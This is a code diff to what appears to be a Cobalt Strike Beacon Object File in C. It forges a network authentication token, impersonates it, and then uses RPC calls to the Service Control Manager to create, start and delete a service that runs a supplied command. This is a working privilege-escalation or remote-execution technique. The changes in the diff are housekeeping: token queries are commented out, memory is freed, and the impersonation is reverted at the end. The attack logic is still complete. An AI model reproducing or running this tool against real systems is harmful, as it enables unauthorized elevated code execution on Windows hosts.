@@ -8,8 +8,7 @@
 #include <windows.h>
 
 void go(char *args, int argc) {
-    if(!bofstart())
-        return;
+    if (!bofstart()) return;
 
     datap Parser = {0};
     PSTR pstrCommand = {0};
@@ -23,21 +22,24 @@ void go(char *args, int argc) {
     pstrCommand = BeaconDataExtract(&Parser, &dwCommand);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Command: %s\n", pstrCommand);
 
-    hCurrentToken = TokenCurrentHandle();
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Got Current Token: 0x%x\n", hCurrentToken);
+    /*     hCurrentToken = TokenCurrentHandle(); */
+    /*     BeaconPrintf(CALLBACK_OUTPUT, "[+] Got Current Token: 0x%x\n", */
+    /*                  hCurrentToken); */
 
-    if (!TokenQueryOwner(hCurrentToken, &CurrentUser,
-                         TOKEN_OWNER_FLAG_DEFAULT)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Can't Query Token User Owner !\n");
-        return;
-    }
+    /*     if (!TokenQueryOwner(hCurrentToken, &CurrentUser, */
+    /*                          TOKEN_OWNER_FLAG_DEFAULT)) { */
+    /*         BeaconPrintf(CALLBACK_ERROR, "[-] Can't Query Token User Owner
+     * !\n"); */
+    /*         return; */
+    /*     } */
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Current User: %ls\n", CurrentUser.Buffer);
-    if (!TokenQueryPrivs(hCurrentToken, &pPrivsList, &dwPrivsCount)) {
-        BeaconPrintf(CALLBACK_ERROR,
-                     "[-] Can't Query Token User Privileges !\n");
-        return;
-    }
+    /*     BeaconPrintf(CALLBACK_OUTPUT, "[+] Current User: %ls\n", */
+    /*                  CurrentUser.Buffer); */
+    /*     if (!TokenQueryPrivs(hCurrentToken, &pPrivsList, &dwPrivsCount)) { */
+    /*         BeaconPrintf(CALLBACK_ERROR, */
+    /*                      "[-] Can't Query Token User Privileges !\n"); */
+    /*         return; */
+    /*     } */
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Trying get Network Token\n");
     hNetworkToken = ForgeNetworkAuthToken();
@@ -46,14 +48,15 @@ void go(char *args, int argc) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Can't Get Network Token !\n");
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Got Network Token: 0x%x\n", hNetworkToken);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Got Network Token: 0x%x\n",
+                 hNetworkToken);
 
-    if (!TokenQueryPrivs(hNetworkToken, &pNetworkPrivsList,
-                         &dwNetworkPrivsCount)) {
-        BeaconPrintf(CALLBACK_ERROR,
-                     "[-] Can't Query Netwok Token Privileges !\n");
-        return;
-    }
+    /* if (!TokenQueryPrivs(hNetworkToken, &pNetworkPrivsList, */
+    /*                      &dwNetworkPrivsCount)) { */
+    /*     BeaconPrintf(CALLBACK_ERROR, */
+    /*                  "[-] Can't Query Netwok Token Privileges !\n"); */
+    /*     return; */
+    /* } */
 
     ADVAPI32$ImpersonateLoggedOnUser(hNetworkToken);
 
@@ -113,6 +116,7 @@ void go(char *args, int argc) {
     if (RpcSendRequest(RpcConnection, RPC_CMD_ID_OPEN_SC_MANAGER) != 0) {
         // error
         RpcDisconnect(RpcConnection);
+        MSVCRT$free(RpcConnection);
         BeaconPrintf(CALLBACK_ERROR, "Send Return Error!\n");
         return;
     }
@@ -122,6 +126,7 @@ void go(char *args, int argc) {
         RPC_OUTPUT_LENGTH_OPEN_SC_MANAGER) {
         // error
         RpcDisconnect(RpcConnection);
+        MSVCRT$free(RpcConnection);
         BeaconPrintf(CALLBACK_ERROR, "Validate Rpc output Return Error!\n");
         return;
     }
@@ -133,6 +138,7 @@ void go(char *args, int argc) {
     if (dwReturnValue != 0) {
         BeaconPrintf(CALLBACK_ERROR, "Check Return Error!\n");
         RpcDisconnect(RpcConnection);
+        MSVCRT$free(RpcConnection);
         return;
     }
 
@@ -171,7 +177,7 @@ void go(char *args, int argc) {
     if (RpcSendRequest(RpcConnection, RPC_CMD_ID_CREATE_SERVICE) != 0) {
         // error
         RpcDisconnect(RpcConnection);
-
+        MSVCRT$free(RpcConnection);
         BeaconPrintf(CALLBACK_ERROR, "Rpc Send error");
         return;
     }
@@ -181,7 +187,7 @@ void go(char *args, int argc) {
         RPC_OUTPUT_LENGTH_CREATE_SERVICE) {
         // error
         RpcDisconnect(RpcConnection);
-
+        MSVCRT$free(RpcConnection);
         BeaconPrintf(CALLBACK_ERROR, "validate RPC output error");
         return;
     }
@@ -215,7 +221,7 @@ void go(char *args, int argc) {
     if (RpcSendRequest(RpcConnection, RPC_CMD_ID_START_SERVICE) != 0) {
         // error
         RpcDisconnect(RpcConnection);
-
+        MSVCRT$free(RpcConnection);
         BeaconPrintf(CALLBACK_ERROR, "Send Request error");
         return;
     }
@@ -225,7 +231,7 @@ void go(char *args, int argc) {
         RPC_OUTPUT_LENGTH_START_SERVICE) {
         // error
         RpcDisconnect(RpcConnection);
-
+        MSVCRT$free(RpcConnection);
         BeaconPrintf(CALLBACK_ERROR, "Validate error");
         return;
     }
@@ -251,6 +257,7 @@ void go(char *args, int argc) {
         // error
         RpcDisconnect(RpcConnection);
         BeaconPrintf(CALLBACK_ERROR, "DeleteService Error!\n");
+        MSVCRT$free(RpcConnection);
         return;
     }
 
@@ -271,6 +278,7 @@ void go(char *args, int argc) {
         BeaconPrintf(CALLBACK_ERROR, "Validate Rpc Output Data Error!\n");
 
         RpcDisconnect(RpcConnection);
+        MSVCRT$free(RpcConnection);
 
         return;
     }
@@ -279,6 +287,14 @@ void go(char *args, int argc) {
 
     // disconnect from rpc pipe
     if (RpcDisconnect(RpcConnection) != 0) {
+
+        MSVCRT$free(RpcConnection);
         return;
     }
+
+    MSVCRT$free(RpcConnection);
+
+    ADVAPI32$RevertToSelf();
+    KERNEL32$CloseHandle(hNetworkToken);
+    return;
 }
